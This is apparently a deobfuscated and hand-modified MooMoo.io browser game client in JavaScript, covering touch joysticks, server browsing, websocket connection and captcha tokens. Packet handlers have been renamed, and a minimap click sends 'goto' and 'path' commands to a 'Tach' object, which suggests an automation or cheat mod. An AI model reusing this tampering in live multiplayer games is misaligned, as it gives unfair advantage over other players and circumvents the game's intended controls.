        i.restTimeout = setTimeout(function() {
        typeof e == "function" && e.call(i),
            i.restCallback()
    }, i.options.fadeTime)
}
;
he.prototype.restCallback = function() {
    var e = this
    , t = {};
    t.front = as("transition", "none", ""),
        e.applyStyles(t),
        e.trigger("rested", e.instance)
}
;
he.prototype.resetDirection = function() {
    this.direction = {
        x: !1,
        y: !1,
        angle: !1
    }
}
;
he.prototype.computeDirection = function(e) {
    var t = e.angle.radian, i = PI / 4, s = PI / 2, n, r, o;
    if (t > i && t < i * 3 && !e.lockX ? n = "up" : t > -i && t <= i && !e.lockY ? n = "left" : t > -i * 3 && t <= -i && !e.lockX ? n = "down" : e.lockY || (n = "right"),
        e.lockY || (t > -s && t < s ? r = "left" : r = "right"),
        e.lockX || (t > 0 ? o = "up" : o = "down"),
        e.force > this.options.threshold) {
        var l = {}, c;
        for (c in this.direction)
            this.direction.hasOwnProperty(c) && (l[c] = this.direction[c]);
        var a = {};
        this.direction = {
            x: r,
            y: o,
            angle: n
        },
            e.direction = this.direction;
        for (c in l)
            l[c] === this.direction[c] && (a[c] = !0);
        if (a.x && a.y && a.angle)
            return e;
        (!a.x || !a.y) && this.trigger("plain", e),
            a.x || this.trigger("plain:" + r, e),
            a.y || this.trigger("plain:" + o, e),
            a.angle || this.trigger("dir dir:" + n, e)
    } else
        this.resetDirection();
    return e
}
;
function ae(e, t) {
    var i = this;
    i.nipples = [],
        i.idles = [],
        i.actives = [],
        i.ids = [],
        i.pressureIntervals = {},
        i.manager = e,
        i.id = ae.id,
        ae.id += 1,
        i.defaults = {
        zone: document.body,
        multitouch: !1,
        maxNumberOfNipples: 10,
        mode: "dynamic",
        position: {
            top: 0,
            left: 0
        },
        catchDistance: 200,
        size: 100,
        threshold: .1,
        color: "white",
        fadeTime: 250,
        dataOnly: !1,
        restJoystick: !0,
        restOpacity: .5,
        lockX: !1,
        lockY: !1,
        shape: "circle",
        dynamicPage: !1,
        follow: !1
    },
        i.config(t),
        (i.options.mode === "static" || i.options.mode === "semi") && (i.options.multitouch = !1),
        i.options.multitouch || (i.options.maxNumberOfNipples = 1);
    const s = getComputedStyle(i.options.zone.parentElement);
    return s && s.display === "flex" && (i.parentIsFlex = !0),
        i.updateBox(),
        i.prepareNipples(),
        i.bindings(),
        i.begin(),
        i.nipples
}
ae.prototype = new Ve;
ae.constructor = ae;
ae.id = 0;
ae.prototype.prepareNipples = function() {
    var e = this
    , t = e.nipples;
    t.on = e.on.bind(e),
        t.off = e.off.bind(e),
        t.options = e.options,
        t.destroy = e.destroy.bind(e),
        t.ids = e.ids,
        t.id = e.id,
        t.processOnMove = e.processOnMove.bind(e),
        t.processOnEnd = e.processOnEnd.bind(e),
        t.get = function(i) {
        if (i === void 0)
            return t[0];
        for (var s = 0, n = t.length; s < n; s += 1)
            if (t[s].identifier === i)
                return t[s];
        return !1
    }
}
;
ae.prototype.bindings = function() {
    var e = this;
    e.bindEvt(e.options.zone, "start"),
        e.options.zone.style.touchAction = "none",
        e.options.zone.style.msTouchAction = "none"
}
;
ae.prototype.begin = function() {
    var e = this
    , t = e.options;
    if (t.mode === "static") {
        var i = e.createNipple(t.position, e.manager.getIdentifier());
        i.add(),
            e.idles.push(i)
    }
}
;
ae.prototype.createNipple = function(e, t) {
    var i = this
    , s = i.manager.scroll
    , n = {}
    , r = i.options
    , o = {
        x: i.parentIsFlex ? s.x : s.x + i.box.left,
        y: i.parentIsFlex ? s.y : s.y + i.box.top
    };
    if (e.x && e.y)
        n = {
            x: e.x - o.x,
            y: e.y - o.y
        };
    else if (e.top || e.right || e.bottom || e.left) {
        var l = document.createElement("DIV");
        l.style.display = "hidden",
            l.style.top = e.top,
            l.style.right = e.right,
            l.style.bottom = e.bottom,
            l.style.left = e.left,
            l.style.position = "absolute",
            r.zone.appendChild(l);
        var c = l.getBoundingClientRect();
        r.zone.removeChild(l),
            n = e,
            e = {
            x: c.left + s.x,
            y: c.top + s.y
        }
    }
    var a = new he(i,{
        color: r.color,
        size: r.size,
        threshold: r.threshold,
        fadeTime: r.fadeTime,
        dataOnly: r.dataOnly,
        restJoystick: r.restJoystick,
        restOpacity: r.restOpacity,
        mode: r.mode,
        identifier: t,
        position: e,
        zone: r.zone,
        frontPosition: {
            x: 0,
            y: 0
        },
        shape: r.shape
    });
    return r.dataOnly || (ir(a.ui.el, n),
                          ir(a.ui.front, a.frontPosition)),
        i.nipples.push(a),
        i.trigger("added " + a.identifier + ":added", a),
        i.manager.trigger("added " + a.identifier + ":added", a),
        i.bindNipple(a),
        a
}
;
ae.prototype.updateBox = function() {
    var e = this;
    e.box = e.options.zone.getBoundingClientRect()
}
;
ae.prototype.bindNipple = function(e) {
    var t = this, i, s = function(n, r) {
        i = n.type + " " + r.id + ":" + n.type,
            t.trigger(i, r)
    };
    e.on("destroyed", t.onDestroyed.bind(t)),
        e.on("shown hidden rested dir plain", s),
        e.on("dir:up dir:right dir:down dir:left", s),
        e.on("plain:up plain:right plain:down plain:left", s)
}
;
ae.prototype.pressureFn = function(e, t, i) {
    var s = this
    , n = 0;
    clearInterval(s.pressureIntervals[i]),
        s.pressureIntervals[i] = setInterval(function() {
        var r = e.force || e.pressure || e.webkitForce || 0;
        r !== n && (t.trigger("pressure", r),
                    s.trigger("pressure " + t.identifier + ":pressure", r),
                    n = r)
    }
                                             .bind(s), 100)
}
;
ae.prototype.onstart = function(e) {
    var t = this
    , i = t.options
    , s = e;
    e = ao(e),
        t.updateBox();
    var n = function(r) {
        t.actives.length < i.maxNumberOfNipples ? t.processOnStart(r) : s.type.match(/^touch/) && (Object.keys(t.manager.ids).forEach(function(o) {
            if (Object.values(s.touches).findIndex(function(c) {
                return c.identifier === o
            }) < 0) {
                var l = [e[0]];
                l.identifier = o,
                    t.processOnEnd(l)
            }
        }),
                                                                                                   t.actives.length < i.maxNumberOfNipples && t.processOnStart(r))
    };
    return zn(e, n),
        t.manager.bindDocument(),
        !1
}
;
ae.prototype.processOnStart = function(e) {
    var t = this, i = t.options, s, n = t.manager.getIdentifier(e), r = e.force || e.pressure || e.webkitForce || 0, o = {
        x: e.pageX,
        y: e.pageY
    }, l = t.getOrCreate(n, o);
    l.identifier !== n && t.manager.removeIdentifier(l.identifier),
        l.identifier = n;
    var c = function(u) {
        u.trigger("start", u),
            t.trigger("start " + u.id + ":start", u),
            u.show(),
            r > 0 && t.pressureFn(e, u, u.identifier),
            t.processOnMove(e)
    };
    if ((s = t.idles.indexOf(l)) >= 0 && t.idles.splice(s, 1),
        t.actives.push(l),
        t.ids.push(l.identifier),
        i.mode !== "semi")
        c(l);
    else {
        var a = fi(o, l.position);
        if (a <= i.catchDistance)
            c(l);
        else {
            l.destroy(),
                t.processOnStart(e);
            return
        }
    }
    return l
}
;
ae.prototype.getOrCreate = function(e, t) {
    var i = this, s = i.options, n;
    return /(semi|static)/.test(s.mode) ? (n = i.idles[0],
                                           n ? (i.idles.splice(0, 1),
                                                n) : s.mode === "semi" ? i.createNipple(t, e) : (console.warn("Coudln't find the needed nipple."),
                                                                                                 !1)) : (n = i.createNipple(t, e),
                                                                                                         n)
}
;
ae.prototype.processOnMove = function(e) {
    var t = this
    , i = t.options
    , s = t.manager.getIdentifier(e)
    , n = t.nipples.get(s)
    , r = t.manager.scroll;
    if (!wh(e)) {
        this.processOnEnd(e);
        return
    }
    if (!n) {
        console.error("Found zombie joystick with ID " + s),
            t.manager.removeIdentifier(s);
        return
    }
    if (i.dynamicPage) {
        var o = n.el.getBoundingClientRect();
        n.position = {
            x: r.x + o.left,
            y: r.y + o.top
        }
    }
    n.identifier = s;
    var l = n.options.size / 2
    , c = {
        x: e.pageX,
        y: e.pageY
    };
    i.lockX && (c.y = n.position.y),
        i.lockY && (c.x = n.position.x);
    var a = fi(c, n.position), u = mh(c, n.position), p = Bn(u), h = a / l, m = {
        distance: a,
        position: c
    }, w, v;
    if (n.options.shape === "circle" ? (w = min(a, l),
                                        v = gh(n.position, w, u)) : (v = xh(c, n.position, l),
                                                                     w = fi(v, n.position)),
        i.follow) {
        if (a > l) {
            let S = c.x - v.x
            , O = c.y - v.y;
            n.position.x += S,
                n.position.y += O,
                n.el.style.top = n.position.y - (t.box.top + r.y) + "px",
                n.el.style.left = n.position.x - (t.box.left + r.x) + "px",
                a = fi(c, n.position)
        }
    } else
        c = v,
            a = w;
    var x = c.x - n.position.x
    , D = c.y - n.position.y;
    n.frontPosition = {
        x,
        y: D
    },
        i.dataOnly || (n.ui.front.style.transform = "translate(" + x + "px," + D + "px)");
    var k = {
        identifier: n.identifier,
        position: c,
        force: h,
        pressure: e.force || e.pressure || e.webkitForce || 0,
        distance: a,
        angle: {
            radian: p,
            degree: u
        },
        vector: {
            x: x / l,
            y: -D / l
        },
        raw: m,
        instance: n,
        lockX: i.lockX,
        lockY: i.lockY
    };
    k = n.computeDirection(k),
        k.angle = {
        radian: Bn(180 - u),
        degree: 180 - u
    },
        n.trigger("move", k),
        t.trigger("move " + n.id + ":move", k)
}
;
ae.prototype.processOnEnd = function(e) {
    var t = this
    , i = t.options
    , s = t.manager.getIdentifier(e)
    , n = t.nipples.get(s)
    , r = t.manager.removeIdentifier(n.identifier);
    n && (i.dataOnly || n.hide(function() {
        i.mode === "dynamic" && (n.trigger("removed", n),
                                 t.trigger("removed " + n.id + ":removed", n),
                                 t.manager.trigger("removed " + n.id + ":removed", n),
                                 n.destroy())
    }),
          clearInterval(t.pressureIntervals[n.identifier]),
          n.resetDirection(),
          n.trigger("end", n),
          t.trigger("end " + n.id + ":end", n),
          t.ids.indexOf(n.identifier) >= 0 && t.ids.splice(t.ids.indexOf(n.identifier), 1),
          t.actives.indexOf(n) >= 0 && t.actives.splice(t.actives.indexOf(n), 1),
          /(semi|static)/.test(i.mode) ? t.idles.push(n) : t.nipples.indexOf(n) >= 0 && t.nipples.splice(t.nipples.indexOf(n), 1),
          t.manager.unbindDocument(),
          /(semi|static)/.test(i.mode) && (t.manager.ids[r.id] = r.identifier))
}
;
ae.prototype.onDestroyed = function(e, t) {
    var i = this;
    i.nipples.indexOf(t) >= 0 && i.nipples.splice(i.nipples.indexOf(t), 1),
        i.actives.indexOf(t) >= 0 && i.actives.splice(i.actives.indexOf(t), 1),
        i.idles.indexOf(t) >= 0 && i.idles.splice(i.idles.indexOf(t), 1),
        i.ids.indexOf(t.identifier) >= 0 && i.ids.splice(i.ids.indexOf(t.identifier), 1),
        i.manager.removeIdentifier(t.identifier),
        i.manager.unbindDocument()
}
;
ae.prototype.destroy = function() {
    var e = this;
    e.unbindEvt(e.options.zone, "start"),
        e.nipples.forEach(function(i) {
        i.destroy()
    });
    for (var t in e.pressureIntervals)
        e.pressureIntervals.hasOwnProperty(t) && clearInterval(e.pressureIntervals[t]);
    e.trigger("destroyed", e.nipples),
        e.manager.unbindDocument(),
        e.off()
}
;
function de(e) {
    var t = this;
    t.ids = {},
        t.index = 0,
        t.collections = [],
        t.scroll = tr(),
        t.config(e),
        t.prepareCollections();
    var i = function() {
        var n;
        t.collections.forEach(function(r) {
            r.forEach(function(o) {
                n = o.el.getBoundingClientRect(),
                    o.position = {
                    x: t.scroll.x + n.left,
                    y: t.scroll.y + n.top
                }
            })
        })
    };
    wi(window, "resize", function() {
        js(i)
    });
    var s = function() {
        t.scroll = tr()
    };
    return wi(window, "scroll", function() {
        js(s)
    }),
        t.collections
}
de.prototype = new Ve;
de.constructor = de;
de.prototype.prepareCollections = function() {
    var e = this;
    e.collections.create = e.create.bind(e),
        e.collections.on = e.on.bind(e),
        e.collections.off = e.off.bind(e),
        e.collections.destroy = e.destroy.bind(e),
        e.collections.get = function(t) {
        var i;
        return e.collections.every(function(s) {
            return i = s.get(t),
                !i
        }),
            i
    }
}
;
de.prototype.create = function(e) {
    return this.createCollection(e)
}
;
de.prototype.createCollection = function(e) {
    var t = this
    , i = new ae(t,e);
    return t.bindCollection(i),
        t.collections.push(i),
        i
}
;
de.prototype.bindCollection = function(e) {
    var t = this, i, s = function(n, r) {
        i = n.type + " " + r.id + ":" + n.type,
            t.trigger(i, r)
    };
    e.on("destroyed", t.onDestroyed.bind(t)),
        e.on("shown hidden rested dir plain", s),
        e.on("dir:up dir:right dir:down dir:left", s),
        e.on("plain:up plain:right plain:down plain:left", s)
}
;
de.prototype.bindDocument = function() {
    var e = this;
    e.binded || (e.bindEvt(document, "move").bindEvt(document, "end"),
                 e.binded = !0)
}
;
de.prototype.unbindDocument = function(e) {
    var t = this;
    (!Object.keys(t.ids).length || e === !0) && (t.unbindEvt(document, "move").unbindEvt(document, "end"),
                                                 t.binded = !1)
}
;
de.prototype.getIdentifier = function(e) {
    var t;
    return e ? (t = e.identifier === void 0 ? e.pointerId : e.identifier,
                t === void 0 && (t = this.latest || 0)) : t = this.index,
        this.ids[t] === void 0 && (this.ids[t] = this.index,
                                   this.index += 1),
        this.latest = t,
        this.ids[t]
}
;
de.prototype.removeIdentifier = function(e) {
    var t = {};
    for (var i in this.ids)
        if (this.ids[i] === e) {
            t.id = i,
                t.identifier = this.ids[i],
                delete this.ids[i];
            break
        }
    return t
}
;
de.prototype.onmove = function(e) {
    var t = this;
    return t.onAny("move", e),
        !1
}
;
de.prototype.onend = function(e) {
    var t = this;
    return t.onAny("end", e),
        !1
}
;
de.prototype.oncancel = function(e) {
    var t = this;
    return t.onAny("end", e),
        !1
}
;
de.prototype.onAny = function(e, t) {
    var i = this, s, n = "processOn" + e.charAt(0).toUpperCase() + e.slice(1);
    t = ao(t);
    var r = function(l, c, a) {
        a.ids.indexOf(c) >= 0 && (a[n](l),
                                  l._found_ = !0)
    }
    , o = function(l) {
        s = i.getIdentifier(l),
            zn(i.collections, r.bind(null, l, s)),
            l._found_ || i.removeIdentifier(s)
    };
    return zn(t, o),
        !1
}
;
de.prototype.destroy = function() {
    var e = this;
    e.unbindDocument(!0),
        e.ids = {},
        e.index = 0,
        e.collections.forEach(function(t) {
        t.destroy()
    }),
        e.off()
}
;
de.prototype.onDestroyed = function(e, t) {
    var i = this;
    if (i.collections.indexOf(t) < 0)
        return !1;
    i.collections.splice(i.collections.indexOf(t), 1)
}
;
const nr = new de
, sr = {
    create: function(e) {
        return nr.create(e)
    },
    factory: nr
};
let rr = !1;
const Ih = e=>{
    if (rr)
        return;
    rr = !0;
    const t = document.getElementById("touch-controls-left")
    , i = sr.create({
        zone: t
    });
    i.on("start", e.onStartMoving),
        i.on("end", e.onStopMoving),
        i.on("move", e.onRotateMoving);
    const s = document.getElementById("touch-controls-right")
    , n = sr.create({
        zone: s
    });
    n.on("start", e.onStartAttacking),
        n.on("end", e.onStopAttacking),
        n.on("move", e.onRotateAttacking),
        t.style.display = "block",
        s.style.display = "block"
}
, Mh = {
    enable: Ih
};
window.loadedScript = !0;
const Eh = location.hostname !== "localhost" && location.hostname !== "127.0.0.1" && !location.hostname.startsWith("192.168.")
, co = location.hostname === "sandbox-dev.moomoo.io" || location.hostname === "sandbox.moomoo.io"
, Ph = location.hostname === "dev.moomoo.io" || location.hostname === "dev2.moomoo.io"
, Hn = new uc;
let ui, di;
const ki = location.hostname === "localhost" || location.hostname === "127.0.0.1"
, Ch = !1
, ls = ki || Ch;
co ? (ui = "https://api-sandbox.moomoo.io",
      di = "moomoo.io") : Ph ? (ui = "https://api-dev.moomoo.io",
                                di = "moomoo.io") : (ui = "https://api.moomoo.io",
                                                     di = "moomoo.io");
const Ah = !ls
, qe = new we(di,443,50,5,Ah);
qe.debugLog = !1;
const Me = {
    animationTime: 0,
    land: null,
    lava: null,
    x: T.volcanoLocationX,
    y: T.volcanoLocationY
};
function Dh() {
    let e = !1;
    return function(t) {
        (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(t) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(t.substr(0, 4))) && (e = !0)
    }(navigator.userAgent || navigator.vendor || window.opera),
        e
}
const ho = Dh();
let vi = !1
, Fn = !1;
let code;
function Oh() {
    // !ps ||
    //     Fn ||
    //     ((Fn = !0),
    //      Eh || ls
    //      ? window.turnstileToken
    //      ? gn(window.turnstileToken)
    //      : window.grecaptcha.ready(() => {
    //     window.grecaptcha
    //         .execute("6LfahtgjAAAAAF8SkpjyeYMcxMdxIaQeh-VoPATP", {
    //         action: "homepage",
    //     })
    //         .then(function (e) {
    //         gn("re:" + e);
    //     })
    //         .catch(console.error);
    // })
    //      : gn());
    !ps || Fn || (Fn = !0,
                  Eh || ls ? code && gn("alt:" + code) : Ei ? gn("alt:" + code) : gn())

}
let Vn = !1;

function sd(e) {
    var t;
    ((t = e == null ? void 0 : e.detail) == null ? void 0 : t.state) === "verified" && (code = e.detail.payload,
                                                                                        Le.classList.remove("disabled"))
    console.log(code)
}
window.addEventListener("load", () => {
    const e = document.getElementById("altcha");
    e == null || e.addEventListener("statechange", sd)
}
                       );
function gn(e) {
    qe.start(bi, function(t, i, s) {
        let r = "wss" + "://" + t;
        e && (r += "?token=" + encodeURIComponent(e)),
            console.log(r),
            ki && (r = "wss://localhost:3000"),
            knla.connect(r, function(o) {
            if (Vn) {
                Vn = !1;
                return
            }
            Vo(),
                o ? qF(o) : (vi = !0,
                                     bs())
        }, {
/*
antigas game packets/functions
      A: Wh,
            B: vn,
            C: Mf,
            D: Zf,
            E: jf,
            a: nu,
            G: Of,
            H: Wf,
            I: Jf,
            J: Kf,
            K: Bf,
            L: Xf,
            M: Gf,
            N: tu,
            O: iu,
            P: Pf,
            Q: Af,
            R: Cf,
            S: eu,
            T: Oo,
            U: Do,
            V: So,
            X: Yf,
            Y: $f,
            Z: ou,
            g: jh,
            1: nf,
            2: Zh,
            3: ef,
            4: tf,
            5: uf,
            6: yf,
            7: lf,
            8: Ef,
            9: of,
            0: ru
*/
           // mudei o nome de algumas pra ficar mais facil pra eu lembrar qual e qual
            A: qh,
            B: bn,
            C: Iw,
            D: qF,
            E: zF,
            a: Mx,
            G: Fk,
            H: loadObject,
            I: animalUpdate,
            J: animateAnimal,
            K: gatherAnimation,
            L: objectHit,
            M: turretShot,
            N: updatePlayerValue,
            O: healthUpdate,
            P: died,
            Q: removeObject,
            R: removeObjects2,
            S: resourceUpdate,
            T: ageUpdate,
            U: updateUpdate,
            V: itemUpdate,
            X: addProjectile,
            Y: remProjectile,
            Z: serverShutdown,
            g: addAlliance,
            1: deleteAlliance,
            2: Zh,
            3: setPlayerTeam,
            4: setAlliancePlayers,
            5: storebuy,
            6: receiveChat,
            7: updateMinimap,
            8: showText,
            9: pingMinimap,
            0: pingSocketResponse
        })
    }, function(t) {
        console.error("Vultr error:", t),
            alert(`Error:
` + t),
            qF("disconnected")
    }, ki)
}
function cs() {
    return knla.connected
}
function Rh() {
    const t = prompt("party key", bi);
    t && (window.onbeforeunload = void 0,
          window.location.href = "/?server=" + t)
}
const _h = new dc(T)
, fo = Math.PI
, Ze = fo * 2;
Math.lerpAngle = function(e, t, i) {
    abs(t - e) > fo && (e > t ? t += Ze : e += Ze);
    const n = t + (e - t) * i;
    return n >= 0 && n <= Ze ? n : n % Ze
}
;

CanvasRenderingContext2D.prototype.roundRect = function(e, t, i, s, n) {
    return i < 2 * n && (n = i / 2),
        s < 2 * n && (n = s / 2),
        n < 0 && (n = 0),
        this.beginPath(),
        this.moveTo(e + n, t),
        this.arcTo(e + i, t, e + i, t + s, n),
        this.arcTo(e + i, t + s, e, t + s, n),
        this.arcTo(e, t + s, e, t, n),
        this.arcTo(e, t, e + i, t, n),
        this.closePath(),
        this
};
let hs;
typeof Storage < "u" && (hs = !0);
function Di(e, t) {
    hs && localStorage.setItem(e, t)
}
function Nt(e) {
    return hs ? localStorage.getItem(e) : null
}
let xi = Nt("moofoll");
function Bh() {
    xi || (xi = !0,
           Di("moofoll", 1))
}
let uo, $e, mt = 1, be, It, yn, or = Date.now();
//var He;
let Ee;

// game variables
var ye = []
, J = [];
let Oe = [];
var et = []
, Mt = []
, po = new gc(Hc,Mt,J,ye,ue,R,T,C)
, ar = new yc(ye,wc,J,R,null,T,C);
let mo, y, ct = 1, wn = 0, go = 0, yo = 0, Re, _e, lr, fs = 0;
var se = T.maxScreenWidth
, re = T.maxScreenHeight;
let gt, yt, Jt = !1;
document.getElementById("ad-container");
const Oi = document.getElementById("mainMenu")
, Un = document.getElementById("enterGame")
, kn = document.getElementById("promoImg");
document.getElementById("partyButton");
const vn = document.getElementById("joinPartyButton")
, Ln = document.getElementById("settingsButton")
, cr = Ln.getElementsByTagName("span")[0]
, hr = document.getElementById("allianceButton")
, fr = document.getElementById("storeButton")
, ur = document.getElementById("chatButton")
, xt = document.getElementById("gameCanvas")
, M = xt.getContext("2d");
var zh = document.getElementById("serverBrowser");
const Nn = document.getElementById("nativeResolution")
, xn = document.getElementById("showPing");
document.getElementById("playMusic");
const Qt = document.getElementById("pingDisplay")
, dr = document.getElementById("shutdownDisplay")
, Zt = document.getElementById("menuCardHolder")
, qt = document.getElementById("guideCard")
, Et = document.getElementById("loadingText")
, us = document.getElementById("gameUI")
, pr = document.getElementById("actionBar")
, Hh = document.getElementById("scoreDisplay")
, Fh = document.getElementById("foodDisplay")
, Vh = document.getElementById("woodDisplay")
, Uh = document.getElementById("stoneDisplay")
, Lh = document.getElementById("killCounter")
, mr = document.getElementById("leaderboardData")
, jt = document.getElementById("nameInput")
, Le = document.getElementById("itemInfoHolder")
, gr = document.getElementById("ageText")
, yr = document.getElementById("ageBarBody")
, ht = document.getElementById("upgradeHolder")
, ri = document.getElementById("upgradeCounter")
, Te = document.getElementById("allianceMenu")
, oi = document.getElementById("allianceHolder")
, ai = document.getElementById("allianceManager")
, me = document.getElementById("mapDisplay")
, Wt = document.getElementById("diedText")
, Nh = document.getElementById("skinColorHolder")
, ce = me.getContext("2d");
const We = document.getElementById("storeMenu")
, wr = document.getElementById("storeHolder")
, ft = document.getElementById("noticationDisplay")
, Xt = $r.hats
, Gt = $r.accessories;
var ue = new mc(kc,et,C,T);
const ei = "#525252"
, kr = "#3d3f42"
, Xe = 5.5;
T.DAY_INTERVAL / 24;
T.DAY_INTERVAL / 2;

function qh(e) {
    Oe = e.teams
}
let ds = !0;
var ps = !1;
(!ls || ki) && (ps = !0);
window.onblur = function() {
    ds = !1
}
;
window.onfocus = function() {
    ds = !0,
        E && E.alive && xs()
}
;
window.captchaCallbackHook = function() {
    ps = !0
}
;
window.captchaCallbackComplete && window.captchaCallbackHook();
window.addEventListener("keydown", function(e) {
    e.keyCode == 32 && e.target == document.body && e.preventDefault()

});
xt.oncontextmenu = function() {
    return !1
}
;
["touch-controls-left", "touch-controls-right", "touch-controls-fullscreen", "storeMenu"].forEach(e=>{
    document.getElementById(e) && (document.getElementById(e).oncontextmenu = function(t) {
        t.preventDefault()
    }
                                  )
}
                                                                                                 );
function bn(e) {
    vi = !1,
        knla.close(),
        ms(e)
}
function ms(e, t) {
    Oi.style.display = "block",
        us.style.display = "none",
        Zt.style.display = "none",
        Wt.style.display = "none",
        Et.style.display = "block",
        Et.innerHTML = e + (t ? "<a href='javascript:window.location.href=window.location.href' class='ytLink'>reload</a>" : "")
}
function Wh() {
    Qt.hidden = false,
        Et.style.display = "none",
        Oi.style.display = "block",
        Zt.style.display = "block",
        uf(),
        Xh(),
        Af(),
        Et.style.display = "none",
        Zt.style.display = "block";
    let e = Nt("moo_name") || "";
    !e.length && FRVR.profile && (e = FRVR.profile.name(),
                                  e && (e += floor(Math.random() * 90) + 9)),
        jt.value = e || ""
}
function Xh() {
    Un.onclick = C.checkTrusted(function() {
        ms("Connecting..."),
            cs() ? bs() : Oh()
    }),
        C.hookTouchEvents(Un),
        kn && (kn.onclick = C.checkTrusted(function() {
        //   Lo("https://krunker.io/?play=SquidGame_KB")
    }),
               C.hookTouchEvents(kn)),
        vn && (vn.onclick = C.checkTrusted(function() {
        setTimeout(function() {
            Rh()
        }, 10)
    }),
               C.hookTouchEvents(vn)),
        Ln.onclick = C.checkTrusted(function() {
        pf()
    }),
        C.hookTouchEvents(Ln),
        hr.onclick = C.checkTrusted(function() {
        nf()
    }),
        C.hookTouchEvents(hr),
        fr.onclick = C.checkTrusted(function() {
        hf()
    }),
        C.hookTouchEvents(fr),
        ur.onclick = C.checkTrusted(function() {
        Mo()
    }),
        C.hookTouchEvents(ur),
        me.onclick = C.checkTrusted(function(event) {
        console.log(event)

        const meRect = me.getBoundingClientRect();
        const clickX = event.clientX - meRect.left
        const clickY = event.clientY - meRect.top
        let scale = 14400/meRect.width
        const realGameX = clickX * scale;
        const realGameY = clickY * scale;
        // console.log(realGameX, realGameY);
        Tach?.updateChat(`goto ${realGameX} ${realGameY}`, E?.sid);
        Tach?.updateChat("path", E?.sid);
        Ao()
    }),
        C.hookTouchEvents(me)
}
let bi;
const Gh = {
    view: ()=>{
        if (!qe.servers)
            return;
        let e = 0;
        const t = Object.keys(qe.servers).map(i=>{
            const s = qe.regionInfo[i].name;
            let n = 0;
            const r = qe.servers[i].map(o=>{
                var h;
                n += o.playerCount;
                const l = o.selected;
                let c = s + " " + o.name + " [" + Math.min(o.playerCount, 50) + "/" + 50 + "]";
                const a = o.name
                , u = l ? "selected" : "";
                o.ping && ((h = o.pings) == null ? void 0 : h.length) >= 2 ? c += ` [${Math.floor(o.ping)}ms]` : l || (c += " [?]");
                let p = {
                    value: i + ":" + a
                };
                return u && (bi = i + ":" + a,
                             p.selected = !0),
                    Ne("option", p, c)
            }
                                       );
            return e += n,
                [Ne("option[disabled]", `${s} - ${n} players`), r, Ne("option[disabled]")]
        }
                                             );
        return Ne("select", {
            value: bi,
            onfocus: ()=>{
                window.blockRedraw = !0
            }
            ,
            onblur: ()=>{
                window.blockRedraw = !1
            }
            ,
            onchange: Kh
        }, [t, Ne("option[disabled]", `All Servers - ${e} players`)])
    }
};
Ne.mount(zh, Gh);
var qn, Wn;
location.hostname == "sandbox.moomoo.io" ? (qn = "Back to MooMoo",
                                            Wn = "//moomoo.io/") : (qn = "Try the sandbox",
                                                                    Wn = "//sandbox.moomoo.io/");
document.getElementById("altServer").innerHTML = "<a href='" + Wn + "'>" + qn + "<i class='material-icons' style='font-size:10px;vertical-align:middle'>arrow_forward_ios</i></a>";
const Yh = `${ui}/servers?v=1.26`
, wo = async()=>fetch(Yh).then(e=>e.json()).then(async e=>qe.processServers(e)).catch(e=>{
    console.error("Failed to load server data with status code:", e)
}
                                                                                     )
, $h = ()=>wo().then(Wh).catch(e=>{
    console.error("Failed to load.")
}
                              );
window.frvrSdkInitPromise.then(()=>window.FRVR.bootstrapper.complete()).then(()=>$h());
const Kh = e=>{
    if (window.blockRedraw = !1,
        FRVR.channelCharacteristics.allowNavigation) {
        const [t,i] = e.target.value.split(":");
        qe.switchServer(t, i)
    } else
        vi && (vi = !1,
               Fn = !1,
               Vn = !0,
               Ei = !0,
               knla.close())
}
